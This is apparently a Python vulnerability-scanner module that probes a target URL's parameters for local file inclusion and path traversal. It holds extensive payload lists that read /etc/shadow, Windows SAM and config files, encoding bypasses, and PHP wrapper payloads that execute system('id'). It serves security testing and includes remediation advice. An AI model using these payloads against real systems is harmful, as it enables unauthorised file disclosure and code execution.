"""Complete LFI (Local File Inclusion) / Path Traversal Scanner Module.

Supports Linux/Windows path traversal, PHP wrappers, encoding bypasses,
and null byte injection techniques.
"""

import re
from typing import List, Dict, Optional, Any
from urllib.parse import urlencode

from utils.http_client import HttpClient
from utils.encoder import Encoder


class LFIScanner:
    """Local File Inclusion / Path Traversal vulnerability scanner."""

    # Linux file indicators
    LINUX_INDICATORS = {
        '/etc/passwd': [r'root:.*:0:0:', r'daemon:.*:1:1:', r'bin:.*:2:2:', r'nobody:'],
        '/etc/shadow': [r'root:\$[0-9a-z]+\$', r'root:!:', r'root:\*:'],
        '/etc/hosts': [r'127\.0\.0\.1\s+localhost', r'::1\s+localhost'],
        '/etc/hostname': [r'^[a-zA-Z0-9\-]+$'],
        '/etc/issue': [r'Ubuntu|Debian|CentOS|Red Hat|Fedora|Alpine'],
        '/etc/os-release': [r'NAME=', r'VERSION=', r'ID='],
        '/proc/self/environ': [r'PATH=', r'HOME=', r'USER=', r'SHELL='],
        '/proc/version': [r'Linux version \d+\.\d+'],
        '/proc/self/status': [r'Name:', r'Pid:', r'Uid:'],
        '/proc/self/cmdline': [r'[a-z/]+'],
        '/etc/apache2/apache2.conf': [r'ServerRoot', r'DocumentRoot'],
        '/etc/nginx/nginx.conf': [r'server\s*\{', r'location\s'],
        '/var/log/apache2/access.log': [r'\d+\.\d+\.\d+\.\d+.*GET|POST'],
        '/var/log/auth.log': [r'sshd|sudo|login'],
    }

    # Windows file indicators
    WINDOWS_INDICATORS = {
        'C:\\Windows\\win.ini': [r'\[fonts\]', r'\[extensions\]', r'\[mci extensions\]'],
        'C:\\Windows\\system.ini': [r'\[boot\]', r'\[drivers\]', r'\[386Enh\]'],
        'C:\\Windows\\System32\\drivers\\etc\\hosts': [r'127\.0\.0\.1\s+localhost'],
        'C:\\boot.ini': [r'\[boot loader\]', r'\[operating systems\]'],
        'C:\\Windows\\debug\\NetSetup.log': [r'NetpDoDomainJoin'],
        'C:\\inetpub\\wwwroot\\web.config': [r'<configuration>', r'connectionString'],
        'C:\\Windows\\System32\\config\\SAM': [r'.+'],
        'C:\\Windows\\repair\\SAM': [r'.+'],
        'C:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.conf': [r'ServerRoot', r'DocumentRoot'],
    }

    # Linux traversal payloads
    LINUX_PAYLOADS = [
        '../etc/passwd',
        '../../etc/passwd',
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../../../../../../../etc/passwd',
        '../../../../../../../../etc/passwd',
        '../../../../../../../../../etc/passwd',
        '../../../../../../../../../../etc/passwd',
        '/etc/passwd',
        '....//....//....//....//etc/passwd',
        '....\\....\\....\\....\\etc/passwd',
        '..//..//..//..//etc/passwd',
        '.././.././.././../etc/passwd',
        '..%2f..%2f..%2f..%2fetc%2fpasswd',
        '..%252f..%252f..%252f..%252fetc%252fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '..%c0%af..%c0%af..%c0%afetc/passwd',
        '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd',
        '..%c1%9c..%c1%9c..%c1%9cetc/passwd',
        '....//....//....//etc/passwd',
        '/./././././././././etc/passwd',
        '/etc/passwd%00',
        '/etc/passwd%00.html',
        '/etc/passwd%00.php',
        '/etc/passwd%00.jpg',
        '../../../../etc/passwd%00',
        '..\\..\\..\\..\\etc\\passwd',
        '..%5c..%5c..%5c..%5cetc%5cpasswd',
        '/etc/passwd\x00',
        '....//....//etc/passwd',
        '..;/..;/..;/..;/etc/passwd',
        '../etc/passwd\n',
        '/%5C../%5C../%5C../%5C../etc/passwd',
    ]

    # Windows traversal payloads
    WINDOWS_PAYLOADS = [
        '..\\..\\..\\..\\windows\\win.ini',
        '..\\..\\..\\..\\..\\windows\\win.ini',
        '..\\..\\..\\..\\..\\..\\windows\\win.ini',
        '../../../../windows/win.ini',
        '../../../../../windows/win.ini',
        '../../../../../../windows/win.ini',
        'C:\\Windows\\win.ini',
        'C:/Windows/win.ini',
        '\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini',
        '..%5c..%5c..%5c..%5cwindows%5cwin.ini',
        '..%255c..%255c..%255c..%255cwindows%255cwin.ini',
        '..%c0%5c..%c0%5c..%c0%5cwindows%c0%5cwin.ini',
        '....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini',
        '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '../../../../windows/system32/drivers/etc/hosts',
        'C:\\boot.ini',
        '..\\..\\..\\..\\boot.ini',
        '../../../../boot.ini',
        '..%5c..%5c..%5c..%5cboot.ini',
        '..\\..\\..\\..\\inetpub\\wwwroot\\web.config',
        '../../../../inetpub/wwwroot/web.config',
        '..\\..\\..\\..\\windows\\win.ini%00',
        '..\\..\\..\\..\\windows\\win.ini%00.php',
    ]

    # PHP wrapper payloads
    PHP_WRAPPER_PAYLOADS = [
        ('php://filter/convert.base64-encode/resource=/etc/passwd', 'base64'),
        ('php://filter/convert.base64-encode/resource=index.php', 'base64'),
        ('php://filter/convert.base64-encode/resource=config.php', 'base64'),
        ('php://filter/convert.base64-encode/resource=../config.php', 'base64'),
        ('php://filter/convert.base64-encode/resource=../../config.php', 'base64'),
        ('php://filter/read=string.rot13/resource=/etc/passwd', 'rot13'),
        ('php://filter/read=convert.iconv.utf-8.utf-16/resource=/etc/passwd', 'iconv'),
        ('php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd', 'base64'),
        ('php://filter/convert.base64-encode/resource=php://input', 'base64'),
        ('php://input', 'input'),
        ('data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==', 'data'),
        ('data://text/plain,<?php system("id"); ?>', 'data'),
        ('expect://id', 'expect'),
        ('php://filter/convert.base64-encode/resource=.htaccess', 'base64'),
        ('php://filter/convert.base64-encode/resource=/proc/self/environ', 'base64'),
        ('php://filter/convert.base64-encode/resource=/var/log/apache2/access.log', 'base64'),
        ('phar://test.phar/test.txt', 'phar'),
        ('zip://test.zip#test.txt', 'zip'),
        ('file:///etc/passwd', 'file'),
        ('file:///c:/windows/win.ini', 'file'),
        ('php://filter/read=string.strip_tags/resource=/etc/passwd', 'strip'),
        ('php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd', 'chain'),
        ('php://filter/convert.iconv.UTF-8.UTF-7/resource=/etc/passwd', 'iconv'),
    ]

    # Encoding bypass payloads
    ENCODING_BYPASS_PAYLOADS = [
        # Double URL encoding
        ('..%252f..%252f..%252f..%252fetc%252fpasswd', 'double_url'),
        ('..%252f..%252f..%252f..%252fwindows%252fwin.ini', 'double_url'),
        # Unicode/UTF-8 encoding
        ('..%c0%af..%c0%af..%c0%afetc/passwd', 'unicode'),
        ('..%c1%9c..%c1%9c..%c1%9cetc/passwd', 'unicode'),
        ('..%c0%ae%c0%ae%c0%af..%c0%ae%c0%ae%c0%afetc/passwd', 'unicode'),
        ('..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd', 'unicode_fullwidth'),
        # Null byte injection
        ('../../../../etc/passwd%00', 'null_byte'),
        ('../../../../etc/passwd%00.html', 'null_byte'),
        ('../../../../etc/passwd%00.php', 'null_byte'),
        ('../../../../etc/passwd%00.jpg', 'null_byte'),
        ('../../../../etc/passwd%00.png', 'null_byte'),
        ('../../../../etc/passwd\x00', 'null_byte_raw'),
        # Dot truncation (Windows)
        ('../../../../etc/passwd....................................................................................................................................................................................................................................................................................................................................', 'dot_truncation'),
        # Path normalization bypass
        ('....//....//....//....//etc/passwd', 'double_dot'),
        ('....//..//..//..//etc/passwd', 'double_dot'),
        ('/..\\..\\..\\..\\etc\\passwd', 'backslash'),
        ('..\\..\\..\\..\\etc\\passwd', 'backslash'),
        # URL encoding variations
        ('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'url_encoded'),
        ('%2e%2e/%2e%2e/%2e%2e/etc/passwd', 'partial_url'),
        ('%252e%252e%252f%252e%252e%252fetc%252fpasswd', 'triple_url'),
        # Semicolon bypass (Tomcat/Java)
        ('..;/..;/..;/..;/etc/passwd', 'semicolon'),
        ('/..;/..;/..;/etc/passwd', 'semicolon'),
        # Tab/newline injection
        ('....%09/....%09/etc/passwd', 'tab'),
        ('..%0a../..%0a../etc/passwd', 'newline'),
        # Mixed encoding
        ('..%2f..%2f..%2f..%2fetc/passwd', 'mixed'),
        ('%2e%2e/etc/passwd', 'mixed'),
    ]

    def __init__(self, http_client: Optional[HttpClient] = None, timeout: float = 10.0):
        """Initialize LFI scanner."""
        self.client = http_client or HttpClient(timeout=timeout)
        self.encoder = Encoder()
        self.findings: List[Dict[str, Any]] = []

    def scan(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test all file-related parameters for LFI/Path Traversal.

        Args:
            url: Target URL
            params: Dictionary of parameters to test

        Returns:
            List of findings
        """
        self.findings = []

        # Identify file-related parameters
        file_params = self._identify_file_params(params)

        for param_name in file_params:
            # Test Linux paths
            self.findings.extend(self._test_linux(url, param_name, params))
            # Test Windows paths
            self.findings.extend(self._test_windows(url, param_name, params))
            # Test PHP wrappers
            self.findings.extend(self._test_php_wrappers(url, param_name, params))
            # Test encoding bypasses
            self.findings.extend(self._test_encoding_bypass(url, param_name, params))

        return self.findings

    def _identify_file_params(self, params: Dict[str, str]) -> List[str]:
        """Identify parameters likely to be file-related."""
        file_keywords = [
            'file', 'path', 'page', 'include', 'inc', 'dir', 'document',
            'folder', 'root', 'pg', 'style', 'pdf', 'template', 'php_path',
            'doc', 'img', 'image', 'filename', 'filepath', 'load', 'read',
            'content', 'layout', 'mod', 'conf', 'url', 'view', 'name',
            'cat', 'action', 'board', 'date', 'detail', 'download',
            'prefix', 'src', 'lang', 'locale', 'module',
        ]

        file_params = []
        for param_name in params:
            # Check if param name suggests file inclusion
            if any(kw in param_name.lower() for kw in file_keywords):
                file_params.append(param_name)
            # Check if param value looks like a file path
            elif any(ind in params[param_name] for ind in ['.php', '.html', '.jsp', '.asp', '/', '\\']):
                file_params.append(param_name)

        # If no file params identified, test all params
        if not file_params:
            file_params = list(params.keys())

        return file_params

    def _test_linux(self, url: str, param: str, original_params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test Linux-specific LFI payloads.

        Args:
            url: Target URL
            param: Parameter to test
            original_params: Original parameters dict

        Returns:
            List of findings
        """
        findings = []

        for payload in self.LINUX_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                # Check for Linux file indicators
                for target_file, indicators in self.LINUX_INDICATORS.items():
                    for indicator in indicators:
                        if re.search(indicator, response.text):
                            findings.append({
                                'type': 'Local File Inclusion (Linux)',
                                'severity': 'CRITICAL',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f"File content indicator matched: {indicator[:50]}",
                                'target_file': target_file,
                                'remediation': 'Use a whitelist of allowed files. Avoid passing user input to file operations. Use chroot or containerization.',
                                'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                            })
                            return findings  # One finding per param is enough

            except Exception:
                continue

        return findings

    def _test_windows(self, url: str, param: str, original_params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test Windows-specific LFI payloads.

        Args:
            url: Target URL
            param: Parameter to test
            original_params: Original parameters dict

        Returns:
            List of findings
        """
        findings = []

        for payload in self.WINDOWS_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                # Check for Windows file indicators
                for target_file, indicators in self.WINDOWS_INDICATORS.items():
                    for indicator in indicators:
                        if re.search(indicator, response.text, re.IGNORECASE):
                            findings.append({
                                'type': 'Local File Inclusion (Windows)',
                                'severity': 'CRITICAL',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f"Windows file content indicator matched: {indicator[:50]}",
                                'target_file': target_file,
                                'remediation': 'Use a whitelist of allowed files. Avoid passing user input to file operations. Implement proper access controls.',
                                'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                            })
                            return findings

            except Exception:
                continue

        return findings

    def _test_php_wrappers(self, url: str, param: str, original_params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test PHP wrapper payloads (php://filter, data://, etc).

        Args:
            url: Target URL
            param: Parameter to test
            original_params: Original parameters dict

        Returns:
            List of findings
        """
        findings = []

        for payload, wrapper_type in self.PHP_WRAPPER_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                is_vulnerable = False
                evidence = ""

                if wrapper_type == 'base64':
                    # Check for base64-encoded content
                    b64_pattern = re.search(r'[A-Za-z0-9+/]{50,}={0,2}', response.text)
                    if b64_pattern:
                        try:
                            import base64
                            decoded = base64.b64decode(b64_pattern.group()).decode('utf-8', errors='ignore')
                            if any(kw in decoded for kw in ['<?php', 'root:', 'password', 'config', 'database']):
                                is_vulnerable = True
                                evidence = f"Base64 decoded content contains sensitive data: {decoded[:100]}"
                        except Exception:
                            pass

                elif wrapper_type == 'data':
                    # Check if data wrapper executed
                    if 'uid=' in response.text or 'gid=' in response.text:
                        is_vulnerable = True
                        evidence = "Data wrapper executed - RCE possible"

                elif wrapper_type == 'expect':
                    if 'uid=' in response.text or 'gid=' in response.text:
                        is_vulnerable = True
                        evidence = "Expect wrapper executed - RCE confirmed"

                elif wrapper_type == 'input':
                    # php://input requires POST body
                    try:
                        post_resp = self.client.post(url, data='<?php system("id"); ?>')
                        if 'uid=' in post_resp.text:
                            is_vulnerable = True
                            evidence = "php://input wrapper executed - RCE confirmed"
                    except Exception:
                        pass

                elif wrapper_type in ('file', 'rot13', 'iconv', 'strip', 'chain'):
                    # Check for file content indicators
                    for target_file, indicators in self.LINUX_INDICATORS.items():
                        for indicator in indicators:
                            if re.search(indicator, response.text):
                                is_vulnerable = True
                                evidence = f"File wrapper returned content matching: {indicator[:50]}"
                                break
                        if is_vulnerable:
                            break

                if is_vulnerable:
                    severity = 'CRITICAL' if wrapper_type in ('data', 'expect', 'input') else 'HIGH'
                    findings.append({
                        'type': f'PHP Wrapper Inclusion ({wrapper_type})',
                        'severity': severity,
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': evidence,
                        'remediation': 'Disable dangerous PHP wrappers in php.ini (allow_url_include=Off). Use whitelist for file inclusion.',
                        'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                    })
                    return findings

            except Exception:
                continue

        return findings

    def _test_encoding_bypass(self, url: str, param: str, original_params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Test encoding bypass techniques.

        Args:
            url: Target URL
            param: Parameter to test
            original_params: Original parameters dict

        Returns:
            List of findings
        """
        findings = []

        for payload, bypass_type in self.ENCODING_BYPASS_PAYLOADS:
            try:
                test_params = {**original_params, param: payload}
                response = self.client.get(url, params=test_params)

                # Check for file content indicators
                for target_file, indicators in {**self.LINUX_INDICATORS, **self.WINDOWS_INDICATORS}.items():
                    for indicator in indicators:
                        if re.search(indicator, response.text, re.IGNORECASE):
                            findings.append({
                                'type': f'Path Traversal ({bypass_type} bypass)',
                                'severity': 'CRITICAL',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f"Encoding bypass successful. File indicator matched: {indicator[:50]}",
                                'bypass_technique': bypass_type,
                                'remediation': 'Decode and normalize paths before validation. Use canonical path checking. Implement allowlist.',
                                'curl_command': self.client.build_curl_command('GET', url, params=test_params),
                            })
                            return findings

            except Exception:
                continue

        return findings
